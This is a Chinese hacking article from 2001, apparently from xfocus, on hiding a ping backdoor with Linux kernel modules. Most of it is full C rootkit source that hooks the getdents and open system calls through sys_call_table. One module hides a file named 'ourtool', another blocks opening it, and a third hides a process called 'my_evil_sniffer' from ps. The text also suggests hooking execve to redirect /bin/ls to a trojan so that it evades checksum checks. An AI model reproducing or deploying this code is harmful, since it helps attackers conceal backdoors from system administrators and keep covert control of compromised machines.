---
title: "pingbackdoor的隐藏"
date: 2001-03-28T00:00:00+08:00
tags: ["Security"]
draft: false
slug: "xfocus-article-141"
---

(quack_at_xfocus.org)

by 大鹰<e4gle@hackermail.com>

[www.patching.net](http://www.patching.net/)


这个程序早已做好，其实完全可以写一个脚本，和现有的lkm结合来隐藏进程，但我想重新改写程序，做成lkm，也就是一个c文件里面，实现功能如下：

 1，隐藏核心符号链接表

 一般的lkm程序都可以在符号链接表里面有标示，所以也极易被管理员发现，首先我们可以不把符号export出去，通过如下例程实现：

 register_symtab(NULL);

 插入到init_module()函数块中

 其次我们可以截获符号链接：

 #define MODULE

 #define __KERNEL__

 

 #include <linux/module.h>

 #include <linux/kernel.h>

 #include <asm/unistd.h>

 #include <sys/syscall.h>

 #include <sys/types.h>

 #include <asm/fcntl.h>

 #include <asm/errno.h>

 #include <linux/types.h>

 #include <linux/dirent.h>

 #include <sys/mman.h>

 #include <linux/string.h>

 #include <linux/fs.h>

 #include <linux/malloc.h>

 

 

 /*获取export出来的函数*/

 extern int *pingbackdoor;

 

 /*我们自己瞎编的一个系统符号如firewall*/

 int new_call_in_firewall()

 {

  return 0;

 }

 

 int init_module(void)                /*加载*/

 {

  pingbackdoor=new_call_in_firewall;

  return 0;

 }

 

 void cleanup_module(void)            /*卸载*/

 {

 }

 在我这个程序中第一种是可行的。

 

 2，隐藏文件本身

 呵呵，其实这个程序被编译一般都需要存储在磁盘，所以就有可能被发现，不管你是搞到..目录也好，都会被发现的，我也可以通过两种方法来解决，一种比较简单，一种隐蔽性强！

 好，看第一种的例程，通过截获ls命令的系统调用，我怎么获知ls用了哪些系统调用呢？谢天谢地，linux里面有个strace工具，而solaris里面有truss工具，呵呵，看看我的strace ls的结果：

 [Hello!root]# strace ls

 execve("/bin/ls", ["ls"], [/* 19 vars */]) = 0

 brk(0)                                  = 0x8053608

 old_mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0

 x40014000

 open("/etc/ld.so.preload", O_RDONLY)    = -1 ENOENT (No such file or directory)

 open("/etc/ld.so.cache", O_RDONLY)      = 3

 fstat(3, {st_mode=S_IFREG|0644, st_size=12625, ...}) = 0

 old_mmap(NULL, 12625, PROT_READ, MAP_PRIVATE, 3, 0) = 0x40015000

 close(3)                                = 0

 open("/lib/libtermcap.so.2", O_RDONLY)  = 3

 fstat(3, {st_mode=S_IFREG|0755, st_size=12224, ...}) = 0

 read(3, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0000\16\0"..., 4096) = 40

 96

 old_mmap(NULL, 15304, PROT_READ|PROT_EXEC, MAP_PRIVATE, 3, 0) = 0x40019000

 mprotect(0x4001c000, 3016, PROT_NONE)   = 0

 old_mmap(0x4001c000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED, 3, 0x200

 0) = 0x4001c000

 close(3)                                = 0

 open("/lib/libc.so.6", O_RDONLY)        = 3

 fstat(3, {st_mode=S_IFREG|0755, st_size=4101324, ...}) = 0

 read(3, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\210\212"..., 4096) = 40

 96

 old_mmap(NULL, 1001564, PROT_READ|PROT_EXEC, MAP_PRIVATE, 3, 0) = 0x4001d000

 mprotect(0x4010a000, 30812, PROT_NONE)  = 0

 old_mmap(0x4010a000, 16384, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED, 3, 0xec

 000) = 0x4010a000

 old_mmap(0x4010e000, 14428, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANON

 YMOUS, -1, 0) = 0x4010e000

 close(3)                                = 0

 mprotect(0x4001d000, 970752, PROT_READ|PROT_WRITE) = 0

 mprotect(0x4001d000, 970752, PROT_READ|PROT_EXEC) = 0

 munmap(0x40015000, 12625)               = 0

 personality(PER_LINUX)                  = 0

 getpid()                                = 9912

 brk(0)                                  = 0x8053608

 brk(0x8053640)                          = 0x8053640

 brk(0x8054000)                          = 0x8054000

 open("/usr/share/locale/locale.alias", O_RDONLY) = 3

 fstat64(0x3, 0xbfffba44)                = -1 ENOSYS (Function not implemented)

 fstat(3, {st_mode=S_IFREG|0644, st_size=2265, ...}) = 0

 old_mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0

 x40015000

 read(3, "# Locale name alias data base.\n#"..., 4096) = 2265

 read(3, "", 4096)                       = 0

 close(3)                                = 0

 munmap(0x40015000, 4096)                = 0

 open("/usr/share/i18n/locale.alias", O_RDONLY) = -1 ENOENT (No such file or dire

 ctory)

 open("/usr/share/locale/en_US/LC_MESSAGES", O_RDONLY) = 3

 fstat(3, {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0

 close(3)                                = 0

 open("/usr/share/locale/en_US/LC_MESSAGES/SYS_LC_MESSAGES", O_RDONLY) = 3

 fstat(3, {st_mode=S_IFREG|0644, st_size=44, ...}) = 0

 old_mmap(NULL, 44, PROT_READ, MAP_PRIVATE, 3, 0) = 0x40015000

 close(3)                                = 0

 brk(0x8055000)                          = 0x8055000

 open("/usr/share/locale/en_US/LC_MONETARY", O_RDONLY) = 3

 fstat(3, {st_mode=S_IFREG|0644, st_size=93, ...}) = 0

 old_mmap(NULL, 93, PROT_READ, MAP_PRIVATE, 3, 0) = 0x40016000

 close(3)                                = 0

 open("/usr/share/locale/en_US/LC_COLLATE", O_RDONLY) = 3

 fstat(3, {st_mode=S_IFREG|0644, st_size=29970, ...}) = 0

 old_mmap(NULL, 29970, PROT_READ, MAP_PRIVATE, 3, 0) = 0x40112000

 close(3)                                = 0

 open("/usr/share/locale/en_US/LC_TIME", O_RDONLY) = 3

 fstat(3, {st_mode=S_IFREG|0644, st_size=508, ...}) = 0

 old_mmap(NULL, 508, PROT_READ, MAP_PRIVATE, 3, 0) = 0x40017000

 close(3)                                = 0

 open("/usr/share/locale/en_US/LC_NUMERIC", O_RDONLY) = 3

 fstat(3, {st_mode=S_IFREG|0644, st_size=27, ...}) = 0

 old_mmap(NULL, 27, PROT_READ, MAP_PRIVATE, 3, 0) = 0x40018000

 close(3)                                = 0

 open("/usr/share/locale/en_US/LC_CTYPE", O_RDONLY) = 3

 fstat(3, {st_mode=S_IFREG|0644, st_size=87756, ...}) = 0

 old_mmap(NULL, 87756, PROT_READ, MAP_PRIVATE, 3, 0) = 0x4011a000

 close(3)                                = 0

 time(NULL)                              = 984434527

 ioctl(1, TCGETS, {B9600 opost isig icanon echo ...}) = 0

 ioctl(1, TIOCGWINSZ, {ws_row=42, ws_col=80, ws_xpixel=0, ws_ypixel=0}) = 0

 brk(0x8058000)                          = 0x8058000

 open("/dev/null", O_RDONLY|O_NONBLOCK|O_DIRECTORY) = -1 ENOTDIR (Not a directory

 )

 open(".", O_RDONLY|O_NONBLOCK|O_DIRECTORY) = 3

 fstat(3, {st_mode=S_IFDIR|0700, st_size=1024, ...}) = 0

 fcntl(3, F_SETFD, FD_CLOEXEC)           = 0

 brk(0x805a000)                          = 0x805a000

 getdents(3, /* 20 entries */, 3391)     = 428

 getdents(3, /* 0 entries */, 3391)      = 0

 close(3)                                = 0

 lstat("/usr", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0

 lstat("/usr/lib", {st_mode=S_IFDIR|0755, st_size=8192, ...}) = 0

 lstat("/usr/lib/gconv", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0

 open("/usr/lib/gconv/gconv-modules", O_RDONLY) = 3

 。。。。。。。。。。。。

 后面很多，但不太重要，实现第一种方法我们只需要截获getdents这个调用就可以了。因为ls就是通过这个系统调用来获得文件及目录列表的。好看例程！

 #define MODULE

 #define __KERNEL__

 

 #include <linux/module.h>

 #include <linux/kernel.h>

 #include <asm/unistd.h>

 #include <sys/syscall.h>

 #include <sys/types.h>

 #include <asm/fcntl.h>

 #include <asm/errno.h>

 #include <linux/types.h>

 #include <linux/dirent.h>

 #include <sys/mman.h>

 #include <linux/string.h>

 #include <linux/fs.h>

 #include <linux/malloc.h>

 

 extern void* sys_call_table[];

 

 int (*orig_getdents) (uint, struct dirent *, uint);

 

 int hacked_getdents(unsigned int fd, struct dirent *dirp, unsigned int count)

 {

  unsigned int tmp, n;

  int t, proc = 0;

  struct inode *dinode;

  struct dirent *dirp2, *dirp3;

  char hide[]="ourtool";                       /*我们要隐藏的文件*/

 

  /*调用原来的getdents -> 将结果保存于临时文件tmp */

  tmp = (*orig_getdents) (fd, dirp, count);

 

  /*对磁盘缓冲的操作*/

  /*这个检查是必须的，因为如果曾经有getdents被调用并且将结果保存缓冲区……*/

 #ifdef __LINUX_DCACHE_H

     dinode = current->files->fd[fd]->f_dentry->d_inode;

 #else

     dinode = current->files->fd[fd]->f_inode;

 #endif

 

  /*dinode是所需的目录的索引结点*/

  if (tmp > 0) 

  {

   /*dirp2是新的dirent结构*/

   dirp2 = (struct dirent *) kmalloc(tmp, GFP_KERNEL);

   /*将dirent结构拷至dirp2*/

   memcpy_fromfs(dirp2, dirp, tmp);

   /*将dirp3指向dirp2*/

   dirp3 = dirp2;

   t = tmp;

   while (t > 0) 

   {

    n = dirp3->d_reclen;

    t -= n;

    /*检查当前文件名是否是我们想要隐藏的名称*/

    if (strstr((char *) &(dirp3->d_name), (char *) &hide) != NULL)

    {

     /*如果有必要的话，修改dirent结构*/

     if (t != 0)

      memmove(dirp3, (char *) dirp3 + dirp3->d_reclen, t);

     else

      dirp3->d_off = 1024;

     tmp -= n;

    }

    if (dirp3->d_reclen == 0) 

    {

     /*

      * workaround for some shitty fs drivers that do not properly

      * feature the getdents syscall.

     */

     tmp -= t;

     t = 0;

    }

   if (t != 0)

    dirp3 = (struct dirent *) ((char *) dirp3 + dirp3->d_reclen);

   }

   memcpy_tofs(dirp, dirp2, tmp);

   kfree(dirp2);

  }

  return tmp;

 }

 

 

 int init_module(void)                /*载入*/

 {

  orig_getdents=sys_call_table[SYS_getdents];

  sys_call_table[SYS_getdents]=hacked_getdents;

  return 0;

 }

 

 void cleanup_module(void)            /*卸载*/

 {

  sys_call_table[SYS_getdents]=orig_getdents; 

                                        

 }

 不过这种方法系统管理员仍然可以通过cat xxx等命令来看到我的程序，只要程序名字起的不要太普通，一般管理员是不会发现的。

 好，我们看第二种隐藏方法，深度隐藏！

 方法是，截获open调用并且检查文件名是否是我的程序名，如果是的话，就拒绝任何open的尝试，所以read/write都不可能实现了，看例程：

 define MODULE

 #define __KERNEL__

 

 #include <linux/module.h>

 #include <linux/kernel.h>

 #include <asm/unistd.h>

 #include <sys/syscall.h>

 #include <sys/types.h>

 #include <asm/fcntl.h>

 #include <asm/errno.h>

 #include <linux/types.h>

 #include <linux/dirent.h>

 #include <sys/mman.h>

 #include <linux/string.h>

 #include <linux/fs.h>

 #include <linux/malloc.h>

 

 extern void* sys_call_table[];

 

 

 int (*orig_open)(const char *pathname, int flag, mode_t mode);

 

 

 int hacked_open(const char *pathname, int flag, mode_t mode)

 {

  char *kernel_pathname;

  char hide[]="ourtool";

  

  /*this is old stuff -> transfer to kernel space*/

  kernel_pathname = (char*) kmalloc(256, GFP_KERNEL);

 

  memcpy_fromfs(kernel_pathname, pathname, 255);

 

  if (strstr(kernel_pathname, (char*)&hide ) != NULL)

  {

   kfree(kernel_pathname);

   /*返回一个‘file does not exist‘的error code*/

   return -ENOENT;

  }

  else

  {

   kfree(kernel_pathname);

   /*没关系，文件名不是ourtool……*/

   return orig_open(pathname, flag, mode);

  }

 }

 

 

 int init_module(void)                /*加载*/

 {

  orig_open=sys_call_table[SYS_open];

  sys_call_table[SYS_open]=hacked_open;

  return 0;

 }

 

 void cleanup_module(void)            /*卸载*/

 {

  sys_call_table[SYS_open]=orig_open;                                      

 }

 好，太长了，下面的隐藏进程以及隐藏网络连接部分下回分解，呵呵

 

好，我们看进程的隐藏，其实道理和前面差不多，我们先来看看ps用了哪些系统调用，以便我们来截获它

[hello!e4gle]# strace ps

.............

open("/proc/10284/stat", O_RDONLY)      = 5

read(5, "10284 (ps) R 10283 10283 10169 7"..., 511) = 185

close(5)                                = 0

open("/proc/10284/statm", O_RDONLY)     = 5

read(5, "115 115 96 5 0 110 19\n", 511) = 22

close(5)                                = 0

open("/proc/10284/status", O_RDONLY)    = 5

read(5, "Name:\tps\nState:\tR (running)\nPid:"..., 511) = 411

close(5)                                = 0

ioctl(1, TIOCGWINSZ, {ws_row=42, ws_col=80, ws_xpixel=0, ws_ypixel=0}) = 0

brk(0)                                  = 0x8162908

brk(0x8162928)                          = 0x8162928

brk(0x8163000)                          = 0x8163000

geteuid()                               = 0

getpid()                                = 10284

lseek(3, 0, SEEK_SET)                   = 0

read(3, "169129.48 167700.41\n", 1023)  = 20

time(NULL)                              = 984486166

open("/proc/meminfo", O_RDONLY)         = 5

...............

我截取了一部分，其实已经可以说明问题，非常简单，象ps之类的命令并不是直接用任何特殊的系统调用来获得当前进程的列表的(也没有系统调用可以完成这项任务) 通过对ps命令的strace，你会发现其实它是从/proc目录里得到进程信息的。在/proc里你可以找到很多目录，它们的名字都是仅仅由数字组成的(比较奇怪吧;)，那些数字就是运行着的进程的PID了，在这些目录里你可以找到与该进程有关的任何信息，所以呢，ps命令其实就是对/proc运行了ls而已，而进程的相关信息，则是在/proc/PID的目录里放着，好了，现在我们有办法了，ps必须从/proc目录里读东西，所以它要用到sys_getdents(...)，我们只要从PID来找出进程名，然后再把PID和/proc里的比较，如果是我们想藏的东西，就象前面所说的隐藏目录一样，把它给封杀掉，上面程序中的两个task的函数及invisible函数仅是用来获得在/proc里找到PID的名字的，至于文件隐藏，不用我多说了罢。


好，我把实现例程贴出来供参考：

#define MODULE

#define __KERNEL__


#include <linux/module.h>

#include <linux/kernel.h>

#include <asm/unistd.h>

#include <sys/syscall.h>

#include <sys/types.h>

#include <asm/fcntl.h>

#include <asm/errno.h>

#include <linux/types.h>

#include <linux/dirent.h>

#include <sys/mman.h>

#include <linux/string.h>

#include <linux/fs.h>

#include <linux/malloc.h>

#include <linux/proc_fs.h>


extern void* sys_call_table[];


/*我们想要隐藏的进程名*/

char mtroj[] = "my_evil_sniffer";


int (*orig_getdents)(unsigned int fd, struct dirent *dirp, unsigned int count);


/*将string转换为数字*/

int myatoi(char *str)

{

 int res = 0;

 int mul = 1;

 char *ptr;

 for (ptr = str + strlen(str) - 1; ptr >= str; ptr--) {

  if (*ptr < '0' || *ptr > '9')

   return (-1);

  res += (*ptr - '0') * mul;

  mul *= 10;

 }

 return (res);

}


/*从PID里取得任务列表的结构*/

struct task_struct *get_task(pid_t pid)

{

 struct task_struct *p = current;

 do {

  if (p->pid == pid)

   return p;

   p = p->next_task;

  }

  while (p != current);

  return NULL;

}


/*从任务列表里取得进程的名字*/

static inline char *task_name(struct task_struct *p, char *buf)

{

 int i;

 char *name;


 name = p->comm;

 i = sizeof(p->comm);

 do {

  unsigned char c = *name;

  name++;

  i--;

  *buf = c;

  if (!c)

   break;

  if (c == '\\') {

   buf[1] = c;

   buf += 2;

   continue;

  }

  if (c == '\n') {

   buf[0] = '\\';

   buf[1] = 'n';

   buf += 2;

   continue;

  }

  buf++;

 }

 while (i);

 *buf = '\n';

 return buf + 1;

}


/*检查这个进程是否是我们想要隐藏的家伙*/

int invisible(pid_t pid)

{

 struct task_struct *task = get_task(pid);

 char *buffer;

 if (task) {

  buffer = kmalloc(200, GFP_KERNEL);

  memset(buffer, 0, 200);

  task_name(task, buffer);

  if (strstr(buffer, (char *) &mtroj)) {

   kfree(buffer);

   return 1;

  }

 }

 return 0;

}


/*从我刚才的第一篇文章就已经说过了，呵呵不多说了*/

int hacked_getdents(unsigned int fd, struct dirent *dirp, unsigned int count)

{

 unsigned int tmp, n;

 int t, proc = 0;

 struct inode *dinode;

 struct dirent *dirp2, *dirp3;


 tmp = (*orig_getdents) (fd, dirp, count);


#ifdef __LINUX_DCACHE_H

 dinode = current->files->fd[fd]->f_dentry->d_inode;

#else

 dinode = current->files->fd[fd]->f_inode;

#endif


 if (dinode->i_ino == PROC_ROOT_INO && !MAJOR(dinode->i_dev) && MINOR(dinode->i_dev) == 1)

  proc=1;

 if (tmp > 0) {

  dirp2 = (struct dirent *) kmalloc(tmp, GFP_KERNEL);

  memcpy_fromfs(dirp2, dirp, tmp);

  dirp3 = dirp2;

  t = tmp;

  while (t > 0) {

   n = dirp3->d_reclen;

   t -= n;

  if ((proc && invisible(myatoi(dirp3->d_name)))) {

   if (t != 0)

    memmove(dirp3, (char *) dirp3 + dirp3->d_reclen, t);

   else

    dirp3->d_off = 1024;

    tmp -= n; 

   }

   if (t != 0)

    dirp3 = (struct dirent *) ((char *) dirp3 + dirp3->d_reclen);

  }

  memcpy_tofs(dirp, dirp2, tmp);

  kfree(dirp2);

 }

 return tmp;

}


int init_module(void)                /*加载*/

{

 orig_getdents=sys_call_table[SYS_getdents];

 sys_call_table[SYS_getdents]=hacked_getdents;

 return 0;

}


void cleanup_module(void)            /*卸载*/

{

 sys_call_table[SYS_getdents]=orig_getdents;                                      

}


其实其他我就不多说了，都是在重复劳动了，同样隐藏网络连接我们可以截获netstat命令的系统调用就可以了。


我们还可以截获sys_execve(...)来重定向系统命令如/bin/ps,/bin/ls，呵呵，其实和本文是两回事了，说说而已，也就是把/bin/ls重定向到我们的ls木马或rootkit程序，这样可以躲过checksum的校验，因为我们根本没有替换/bin/ls，呵呵，照这个思路我们可以做的事情非常多，发挥想象可以做出很多好玩的木马。
